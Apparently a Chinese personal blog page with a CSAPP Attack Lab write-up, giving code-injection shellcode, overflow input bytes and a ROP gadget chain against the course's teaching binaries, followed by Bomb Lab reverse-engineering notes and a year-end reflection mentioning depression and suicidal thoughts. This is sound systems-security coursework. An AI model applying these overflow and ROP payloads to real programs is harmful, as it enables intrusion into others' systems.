<p>至于 <code>hex2raw</code> (Hexadecimal to Raw), 其实就是
<code>echo -n -e "\xc0\x17\x40"</code></p>
<h2 id="phase-0x2">Phase 0x2</h2>
<p>要求将 <code>cookie.txt</code> 作为参数传递给 <code>touch2()</code>
并调用</p>
<p>至此调用函数我们已经非常熟悉了，直接填充对应函数的地址到溢出后的位置即可。<br />
但是我们还需要传递参数，所以就不能再填充 <code>00</code> 了。<br />
这个 <code>ctarget</code>
编译时是关闭栈保护的，也就是说栈内存上的代码可以直接被执行。</p>
<p>编写 <code>phase2_inject.asm</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov      $0x59b997fa, %rdi</span><br><span class="line">pushq    $0x4017ec</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>其中，<code>0x59b997fa</code> 是 cookie，<code>0x4017ec</code> 是
<code>touch2()</code> 的地址。<br />
当然这个是 AT&amp;T 的语法，<code>nasm</code> 默认似乎是 Intel，所以我用
<code>as</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">as phase2_inject.asm</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">objdump -d a.out</span></span><br><span class="line"></span><br><span class="line">a.out:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi</span><br><span class="line">   7:   68 ec 17 40 00          push   $0x4017ec</span><br><span class="line">   c:   c3</span><br></pre></td></tr></table></figure>
<p>于是得到了我们的 <code>inraw.txt</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 90 </span><br><span class="line">68 ec 17 40 00 90 90 90 </span><br><span class="line">c3 00 00 00 00 00 00 00 </span><br><span class="line">90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 </span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
<p>这里 90 是 <code>nop</code>, 用于填充的，不过似乎不需要?<br />
返回地址也直接覆盖为 <code>0x5561dc78</code>，
缓冲区开始的地方，也就是我们注入代码开始的地方<br />
还是要注意小端法。</p>
<p>(用时最短的一个，第一个做完第二个就轻车熟路了)</p>
<h2 id="phase-0x3">Phase 0x3</h2>
<p>查看 <code>attack.pdf</code> 的要求，发现主要是把 cookie
十六进制对应的字符串 ( <span class="math inline">\(without\ a\ leading\
\)</span> <code>0x</code> ), 然后用 <code>hexmatch</code>
比较是否相等。</p>
<p>但是这个 <code>hexmatch</code> 写得太折磨了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hexmatch</span><span class="params">(<span class="type">unsigned</span> val, <span class="type">char</span> * sval)</span> &#123;</span><br><span class="line">    <span class="type">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">    <span class="type">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, sval);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个 110 大小的缓冲区 <code>cbuf</code> 会把我们 inject code 和
cookie string 所在的缓冲区弄得一团糟，而且 random
的存在导致我们不能直接填充这个地址。</p>
<p>解决方案有点取巧。在 gdb 中打断点，分别在 <code>touch3()</code>
起始和<code>hexmatch()</code> 后检查缓冲区 <code>x/100bx 0x556178</code>
，找到前后没变并且<del>看起来</del>没什么用的区域填充 cookie。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 b3 dc 61 55 90 </span><br><span class="line">68 fa 18 40 00 90 90 90 </span><br><span class="line">c3 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 </span><br><span class="line">78 dc 61 55 00 00 00 00 </span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 35 39 62 39 39 </span><br><span class="line">37 66 61 00 90 90 90 90 </span><br></pre></td></tr></table></figure>
<p>这里 <code>0x5561dcb3</code> 及之后是 cookie。 (注意结尾
<code>\0</code> )</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.. .. .. 35 39 62 39 39 </span><br><span class="line">37 66 61 00 .. .. .. ..</span><br></pre></td></tr></table></figure>
<p>完美通过。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">amiriox@makinohara ‹ master ●● › : ~/csapplab/attacklab</span><br><span class="line">[] ξ ./hex2raw &lt; inraw.txt &gt; in.txt &amp;&amp; ./ctarget -q &lt; in.txt</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3(&quot;59b997fa&quot;)</span><br><span class="line">Valid solution for level 3 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">    user id    bovik</span><br><span class="line">    course    15213-f15</span><br><span class="line">    lab    attacklab</span><br><span class="line">    result    1:PASS:0xffffffff:ctarget:3:48 C7 C7 B3 DC 61 55 90 68 FA 18 40 00 90 90 90 C3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 DC 61 55 00 00 00 00 90 90 90 90 90 90 90 90 90 90 90 35 39 62 39 39 37 66 61 00 90 90 90 90 </span><br></pre></td></tr></table></figure>
<h2 id="phase-0x4">Phase 0x4</h2>
<p><code>attack.pdf</code> 中介绍了关于 <code>ROP</code> 的相关知识.</p>
<p>因此推测思路是，通过缓冲区溢出攻击在栈顶放 cookie,<br />
通过 <code>popq %rdi</code> 恢复到 %rdi 寄存器以传参,<br />
然后 <code>call 0x4017ec</code> (<code>touch2()</code>).<br />
但是 gadgets farm 中没有出现 call 的 gadget, 所以只能用 <code>ret</code>
转移到 <code>touch2()</code>,<br />
这样就要保证 <code>popq</code> 弹栈恢复 %rdi 之后的栈顶是
<code>0x4017ec</code>.</p>
<ul>
<li><code>popq %rdi</code> 的机器码是 <code>5f</code></li>
<li><code>ret</code> 的机器码是 <code>c3</code></li>
<li>需要用 <code>nop</code> 即 <code>90</code> 对齐</li>
</ul>
<p>有两个问题需要考虑: 1. 前几个 phase
是上周做的了，这几天一直在复习高数，所以栈的布局还得再研究一下 2.
怎么执行到第一个 gadget ? 第一个 gadget <code>ret</code> 后，会通过 ret
弹出栈顶的地址并跳转到那个地址实现链式调用.</p>
<p>solve: 1. 返回地址在栈上的位置是 <code>0x5561dca0</code> =
<code>0x5561dc78</code> + <code>0x28</code> 2. 第一个 gadget 大概直接在
<code>0x5561dca0</code> 写地址就行，栈保护是没事的因为 gadget
不在栈内存，但是地址随机化不好说。</p>
<p>紧接着发现 gadget farm 里没有 <code>5f</code>, 感觉很不解,
这么精妙的做法, 这 lab 不这么解说明教授水平不行啊。<br />
<code>attacklab.pdf</code> 说只需要两条指令就能做 phase 4, 但是调用
touch2 的 ret 肯定需要一条， 剩下的除了 <code>popq</code>
还能是什么?</p>
<p>谔谔, 卡了半天决定去看 <a
target="_blank" rel="noopener" href="https://arthals.ink/blog/attack-lab">Arthals
在北大计算机系统导论（ICS）课程中所做的详尽笔记</a><br />
这个 lab 是北京大学改过的(甚至还买了 csapp 的版权, 9
爷吃的就是好啊)。<br />
然后发现他们也没给 <code>5f</code>, 那我估计就是先 <code>pop</code> 再
<code>mov</code>, ugly.</p>
<p>重新审阅 <code>rtarget.asm</code> 中 <code>start_farm</code> 到
<code>mid_farm</code> 之间的机器码, 发现有 <code>58</code> 即
<code>popq %rax</code><br />
则我们需要</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">popq    %rax;       ret   # 58 90 c3 at 0x4019cc</span><br><span class="line">movl/q  %rax, %rdi; ret   # 48 89 c7 at 0x4019a2</span><br></pre></td></tr></table></figure>
<p>填充 <code>inraw.txt</code>, 当然传递给 <code>hex2raw</code>
的是不能有注释的.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">cc 19 40 00 00 00 00 00 # 缓冲区溢出的返回地址, 这里 ROP 直接进第一个 gadget = popq %rax; ret</span><br><span class="line">fa 97 b9 59 00 00 00 00 # cookie</span><br><span class="line">a2 19 40 00 00 00 00 00 # movq %rax, %rdi; ret</span><br><span class="line">ec 17 40 00 00 00 00 00 # touch2() 的地址</span><br></pre></td></tr></table></figure>
<p>栈中的情况和具体执行流程:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">+---------------------------+ 高地址</span><br><span class="line">| touch2() 的地址           | &lt;- 由第二个 gadget movq ret 而来.</span><br><span class="line">| movq %rax, %rdi; ret      | &lt;- 由第一个 gadget popq ret 而来, 所谓 gadget 的链式调用。</span><br><span class="line">+---------------------------+</span><br><span class="line">| cookie,被popq弹出,放入rax | &lt;- 缓冲区溢出时地址累加, 但栈向低地址扩张 </span><br><span class="line">| popq %rax; ret            | &lt;- 函数返回时跳转的位置, 弹出 cookie 后栈顶是 movq， 于是 ret 到那里</span><br><span class="line">+---------------------------+</span><br><span class="line">| buffer[40]                | &lt;- callee 的栈帧</span><br><span class="line">| buffer[39]                |</span><br><span class="line">| ... 我们填了40 字节的0    | &lt;- 缓冲区</span><br><span class="line">| buffer[1]                 |</span><br><span class="line">| buffer[0]                 | &lt;- 缓冲区起始           0x5561dc78</span><br><span class="line">+---------------------------+ 低地址</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><del>其实这里直接过了我不太理解的, 为什么不需要保持 rsp 16
位对齐啊?</del></p>
<p>这里没有发生段错误而是直接栈对齐了是因为恰好两次 ret, 每次 +8,<br />
然后调用 touch2 时满足了 rsp 16 位对齐。</p>
<p>说是普通的运算不需要一直保持 <code>rsp % 16 == 0</code>,
只需要在函数调用时满足就可以了, 具体还有待后续学习.</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">amiriox@makinohara ‹ master ●● › : ~/csapplab/attacklab</span><br><span class="line">[1] ξ ./hex2raw &lt; inraw.txt &gt; in.txt &amp;&amp; ./rtarget -q &lt; in.txt</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Misfire: You called touch2(0x3928c8e0)</span><br><span class="line">Ouch!: You caused a segmentation fault!</span><br><span class="line">Better luck next time</span><br><span class="line">FAIL: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:FAIL:0xffffffff:rtarget:0:9E 19 40 00 00 00 00 00 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 9E 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 </span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://amiriox.github.io/2024/12/14/CSAPP-Lab-Bomb/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="amiriox">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Amiriox's Storage">
      <meta itemprop="description" content="Hey.">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Amiriox's Storage">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/12/14/CSAPP-Lab-Bomb/" class="post-title-link" itemprop="url">CSAPP Bomb Lab 达成</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2024-12-14 19:58:00" itemprop="dateCreated datePublished" datetime="2024-12-14T19:58:00+08:00">2024-12-14</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-02-10 14:23:20" itemprop="dateModified" datetime="2025-02-10T14:23:20+08:00">2025-02-10</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/" itemprop="url" rel="index"><span itemprop="name">组成原理</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <hr />
<p>Border relations with Canada have never been better. 直接读phase_1 的
$rdi.</p>
<hr />
<p>1 2 4 8 16 32 利用断点跳到 read_six_number 后, 发现核心代码 add $eax
$eax</p>
<hr />
<p>5 206 rsp+8 rsp+12分别是你输入的两个数, int四字节. 发现一堆, mov
jmp里只有第五个的差能整除8并且mov的值是206(最后几行是核心代码 cmp
0xc(%rsp), %eax</p>
<hr />
<p>7 0 打断点到 phase_4(), 阅读汇编得: 输入两个数, 输入的第一个数 &lt;=
14 rdi: 输入的第一个数 rsi: 0 rdx: 14 func4(x1, 0, 14, 0);</p>
<p>进入 func4() 继续阅读汇编, 顺便翻译一下: def func4(rdi, rsi, rdx,
rcx): rax = rdx - rsi rcx = rax shr 31 rax += rcx rax sar= 1 rcx = rax +
rsi</p>
<pre><code>// summary:
// rax = ((rdx - rsi) + (rdx - rsi) shr 31) sar 1
// rcx = ((rdx - rsi) + (rdx - rsi) shr 31) sar 1 + rsi
if (rdi &lt;= rcx) 
    // 跳到ff2
    if(rdi &gt;= rcx)
      return 0;
    else
        rax = func4(rdi, rsi = rcx + 1, rdx, rcx)
        return (rax = 2 * rax + 1)
else 
    rax = fun4(rdi, rsi, rdx = rcx - 1, rcx)
   return 2 * rax</code></pre>
<p>if(func4() == 0 &amp;&amp; ($rsp + 8) == 0) { ok } else bomb!</p>
<p>优化后得: f (x1, $2, $3): x1 &lt;= $2 + ($3 - $2)/2 x1 == $2 + ($3 -
$2)/2: return 0 else: return 2 * f(x1, ($3 - $2)/2 + 1, $3) + 1 else:
return 2 * f(x1, $2, $2 + ($3 - $2)/2 - 1) 10 0 14 return 2 * f(10, 0,
6)</p>
<p>然后发现其实令 x1 = $2 + ($3 - $2) / 2 即 0 + (14 - 2) / 2 = 7
就行了</p>
<hr />
<p>y_^EFG 字符串长度为6 rbx = rdi(input) rax = 0 while(rax &lt; 6) { rdx
= (<em>(rbx + rax) &amp; 0xf) + 0x4024b0 // input[i] &amp; 1111 +
0x4024b0 </em>(rsp + 10 + rax) = rdx // input[i] = rax += 1 // i++; }
*(rsp + 16) = 0 // ‘\0’ rdi = rsp + 10 // input after processing rsi =
$0x40245e // “flyers” strings_not_equal(rdi, rsi)</p>
<pre><code>       11</code></pre>
<p>maduiersnfotvbyl 0123456789 10</p>
<p>@: 0x4024b0 f: 0x4024b9 +9 0x0009 l: 0x4024bf +15 0x000f y: 0x4024be
+14 0x000e e: 0x4024b5 +5 0x0005 r: 0x4024b6 +6 0x0006 s: 0x4024b7 +7
0x0007 +dd</p>
<p>input[i] ASCII 取后四位 + 0x4024b0
令一个字符c的ASCII的十六进制后四位分别为以上的 %rdx 64位, %edx 32位, $dl
8位 p /x $dl 如输出 0x61, 6是四位, 1也是四位, 因为十六进制最大f(15,
1111) 所以只要ASCII 是 <code>0x*9</code>, <code>0x*f</code>,
<code>0x*e</code>, <code>0x*5</code>, <code>0x*6</code>,
<code>0x*7</code> 的字符就可以了 这里随便选的y_^EFG</p>
<hr />
<p>r13 = &lt;+8&gt;rsp (init - 50) rsi = &lt;+8&gt;rsp</p>
<p>下面是废的, 我有空再补.</p>
<p>这个难度很大. 总之是先查6个数都&lt;=6 且不能重复</p>
<p>然后将每个数 x 变为 7 - x</p>
<p>然后根据新的xi安排在0x6032d0处的一个链表, 安排完要求顺序值递减
查看一下这个链表: (gdb) x/24w 0x6032d0 0x6032d0 <node1>: 332 1 6304480 0
0x6032e0 <node2>: 168 2 6304496 0 0x6032f0 <node3>: 924 3 6304512 0
0x603300 <node4>: 691 4 6304528 0 0x603310 <node5>: 477 5 6304544 0
0x603320 <node6>: 443 6 0 0</p>
<p>递减的话就是 3 4 5 6 1 2 根据7映射回去就是 4 3 2 1 6 5</p>
<p>读入6个数字(rsp也变了)</p>
<p>r14 = &lt;+23&gt;rsp r12d = 0 rbp = r13 rax = <em>r13 - 1 if(rax
&gt;= 5) { //跳到52 r12d += 1 if(r12d == 6) { // 跳到 95 rsi = </em>(rsp
+ 0x18) rax = r14 rcx = 0x7</p>
<p>&lt;+118&gt; while(rax != rsi) { &lt;+108&gt; rdx = rcx rdx -=
<em>rax </em>rax = rdx rax += 0x4 }</p>
<p>&lt;+123&gt; rsi = 0</p>
<p>&lt;+166&gt; while(rcx &gt;= 1) { &lt;+163&gt; rcx = <em>(rsp + rsi)
while(rcx &gt;= 0x1) { // 跳到&lt;+143&gt; &lt;+143&gt; rdx = $0x6032d0
&lt;+148&gt; </em>(0x20 + rsp + 2 * rsi) = rdx &lt;+153&gt; rsi += 0x4
if(rsi = 0x18) { // 跳到183 &lt;+183&gt; codes here (201)
&lt;+212&gt;<br />
while(rax != rsi) {</p>
<pre><code>            &#125;else &#123;

            &#125;
            if(rax == rsi) &#123;
                 //跳到222</code></pre>
<p>&lt;+222&gt;<br />
codes here }else { &lt;+217&gt; codes here &lt;+220&gt; 直接跳201了,
我不理解 } }else { &lt;+163&gt; rcx = *(rsp + rsi) } } }</p>
<pre><code>    rax = 0x1
    rdx = 0x6032d0
    // 跳到 + 130</code></pre>
<p>&lt;+130&gt; do { rdx = *(rdx + 0x8) rax += 1 }while(rax != rcx); //
跳到&lt;+148&gt; goto &lt;+148&gt;: goto &lt;+143&gt;:</p>
<pre><code>&#125;</code></pre>
<p>}else bomb!</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://amiriox.github.io/2022/01/28/2021_face_up_to_calamities/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="amiriox">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Amiriox's Storage">
      <meta itemprop="description" content="Hey.">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Amiriox's Storage">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/01/28/2021_face_up_to_calamities/" class="post-title-link" itemprop="url">直面灾厄 -- 2021 年终总结</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-01-28 01:05:00" itemprop="dateCreated datePublished" datetime="2022-01-28T01:05:00+08:00">2022-01-28</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-02-10 14:23:20" itemprop="dateModified" datetime="2025-02-10T14:23:20+08:00">2025-02-10</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">总结</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="直面灾厄-2021-年终总结">“直面灾厄” —— 2021 年终总结。</h1>
<p>本篇系笔者 2021年年终总结 / 初中毕业总结 / 高一(上)学年生活总结。</p>
<h2 id="part-1.-概括">Part 1. 概括。</h2>
<p>这一年实在是多灾多难的一年。
年初的时候其实还蛮好的（<del>还记得大年初一学对顶堆</del>）
然而接下来经历了中考考前的四个月+考后假期一个月+高一网课一个月+高一线下课四个月
彻底毁了我整个精神状态（或者说引爆了埋在深处的雷罢）</p>
<p>中考考前四个月，我做了大概是目前最后悔的一个决定，我退役了OI。
说是为了学习，其实也只是跟风 包括满足自己虚荣心之类的。
那个时候精神状态就在恶化（尽管现在看来当时算很不错的），
于是还是在颓了四个月之后，甚至还碰运气考上全县前50（大概是35的样子）进了我最恐惧的实验班。</p>
<p>本想着有两个月假期，紧接着 8月15号开学
8月2号开学的消息接踵而至，假期被缩短到了一个月，计划瞬间被打乱。
结果就是，那个假期只有前几天是安安稳稳的。往后的日子，越来越难过。
哪成想 这只是开始。</p>
<p>高一开学后，刚上两天军训就来了疫情。正巧明日方舟夏活，于是上网课写作业，下课打活动，日子也算有滋有味。
……但闲暇时间再细细品味这杯醇香的酒，是不是少了什么？</p>
<p>然后是目前为止我人生中最难度过的四个月。我从未想过我要面对这些，曾经的思考与挣扎，”失败“，与当时的状况相比几乎是无比快乐的。我在那个班级莫名地难受，感到恐惧，感到前所未有的危机感（但并不是文化课上的），我找不出原因（不如说“我至今找不出原因”，因为当时我甚至没有分析问题甚至喘息的机会）。暂时失明，恶心呕吐，感到很多不存在的目光注视自己甚至有生理上感到针扎的痛苦。最致命地，OI上的失意和现实上的重重打击让当时的我选择直接退役，从此告别OI，500多天的OI生涯就此结束。这些夹杂在一起的混乱和悲凉让我无数次想到自杀，甚至付诸实践。幸运的是，祖祖辈辈遗传下来的求生欲和我对OI的执念（毁灭我的亦施舍于我）在死亡线上拉回了我。我开始尝试借助医学的力量。顺便也是在看了一年半的心理医生的建议下，我去了哈医大一院（本想长假去因为不想请假，但心理医生建议我早去）。最后诊断是双相情感障碍，中度焦虑中度抑郁，强迫思维，较严重的心理问题躯体化（其实查出抑郁焦虑啥的很正常，这年头大街上随便拽一个也能查出轻度，至少我是这么认为的）。可能也是走投无路，我也只能相信医生了（话说我哪来的勇气否定医生啊喂）。后来虽然有所稳定，但生活只不过是从持续性的痛苦转移到了一种迷乱之中。如此，内心里的我在一篇黑雾里像个醉汉一样跌跌撞撞，现实里的我完全没有自己意识地跟着整个实验班一起卷文化课，每天在没有自我的生活里拼杀。这样下来，总算熬过了四个月的课程，迎来了寒假。</p>
<p>然后是放假到现在。不如来活跃下思维，想一想假如你经历了上述场景放假这些天会怎么样？</p>
<p>至于我嘛…
毫无疑问地我颓了。如你所见作业一点没写，OI搞了一点也是逼着自己强行搞的。
颓废过程中我意识到我没法掌控自己的身体和精神了，但是这可能是高中三年唯一一个超过一个月的假期了，必须好好珍惜。
于是我只好采取些折中的暂时性战略，比如抱着玩而不是学东西的心态搞OI，也不追求学到点什么。
虽然效率极低，但起码是在向前走的。</p>
<figure>
<img src="https://s4.ax1x.com/2022/01/28/7vla0H.png" alt="7vla0H.png" />
<figcaption aria-hidden="true">7vla0H.png</figcaption>
</figure>
<p>必须有所改变。根本上的原因很难找到，但起码要有一些措施来改变现状。
展望未来的事情写在最后，这是总结文。</p>
<h2 id="part-2.-年终总结之2021经历">Part 2. 年终总结之2021经历。</h2>
<p>相对于去年（可以看我去年的总结），两个学期都在文化课里的我显然没什么好写的东西。</p>
<p>不过有一个最大的灾厄。我错过了2021年的<code>CSP</code>。因为这天杀的疫情。
<code>疫情，騲</code></p>
<p>去年一整年的危机感大多来源于对于自己实力的怀疑。事实上我觉得这是自学OI的OIer最容易遇到也是最难克服的心理问题。
但多亏（？或者说不幸的是）我的强迫思维，我总觉得我起码要拿个CSP
pj1=的奖才算底线。然而2020年因为T1忘删<code>freopen</code>注释痛失100分拿了个2=，那一年我的内心就越来越焦虑，加上月赛经常Div
2.爆零，出了偶尔ABC的123题能让我找回点信心，我的自信几乎都建立在空中楼阁上。</p>
<p>错过CSP那阵子正是我发病最严重的日子，因为发病的事甚至顾不上OI，反而是减轻了些痛苦。
但2022年的CSP，我决不可能错过了，这是我高中生涯的最后一次机会。</p>
<p>这一年OI始终是穿插着我生活的一条暗线，而明线就是一路上的鲜血，那在我埋下头消化自己的痛苦时感受到若隐若无紧紧抓着我肺部的怪物。
但在这一篇乌烟瘴气之中，仿佛有微光乍现。
非常感谢我的朋友（包括@西卡洛斯）这一年对我的支持，让我在极端难受的时候有一个倾诉的人，非常庆幸有人能理解自己
非常感谢明日方舟以及罗德岛的各位在这一年对我精神上的慰藉，让我在失去自我的时候让我不至于被世界所缚。</p>
<p>以及十分感谢学校饭堂的没有一点肉的酸菜猪肉馅饺子，给了我在情绪暴躁的时候骂街的对象。
而且还有人和我一起骂，很爽。很解气。</p>
<p>好的方面实在没什么好写的了，今年实在是白过的一年。</p>
<ul>
<li>入坑了penbeat 当然现在也荒废了</li>
<li>入坑了phigros 当然现在很少玩了</li>
<li>比较重要的一件事是，当时给自己一个定心的方案就是“每晚固定至少30
min看洛谷网校的秋令营，这倒是有一定成效</li>
<li>中考考体育的时候一千米长跑当着几百人面大喊为斯卡蒂线上献上心脏，跑了人生中唯一一次一千米满分。</li>
<li>至于算法，<del>好像一个没学</del>
复习巩固了很多东西，对之前似懂非懂的东西逐渐完善，也了解了一些思想</li>
<li>大大提升了抗压能力。桥洞下盖小被，啊对对对</li>
</ul>
<h2 id="part-3.-年终总结之今年的优缺点">Part 3.
年终总结之今年的优缺点</h2>
<ul>
<li><p>优点</p>
<ul>
<li>除了几次极端情况，大多数无论有多痛苦，我都是还会分析现状，设计计划，拼命尽力执行。精神可嘉。<del>意思就是行动力太差</del></li>
<li>总体上保持进步状态，虽然现实上没有在进步的趋势。<del>其实还是说行动力太差</del></li>
<li>思考问题更加有逻辑，同时更灵活，能更一阵见血地看到问题本质，在遇到一些问题的时候起了不少作用。</li>
<li>文化课上写课外题还不错
（~<sub>唯一一次把自己买的课外题写完超80%以上的，还是六科一科1</sub>2本~~）</li>
<li>过的一塌糊涂，实在想不出怎么夸自己了。</li>
</ul></li>
<li><p>缺点</p>
<ul>
<li>行动力实在太差。用疾病给自己找借口未免过于懦弱，其实还是精神上不够坚韧。</li>
<li>太颓废，太依赖学校环境学文化课，回到家一塌糊涂啥也不想干，生物钟完全混乱导致上课精神不好（影响最大的其实是生物，其他科尤其是英语多半还是靠课下的贡献）</li>
<li>攀比心太强</li>
</ul></li>
<li><p>总结</p>
<ul>
<li><p>令我感到十分意外，这次缺点写的比优点少，这大概不是我的风格罢。</p></li>
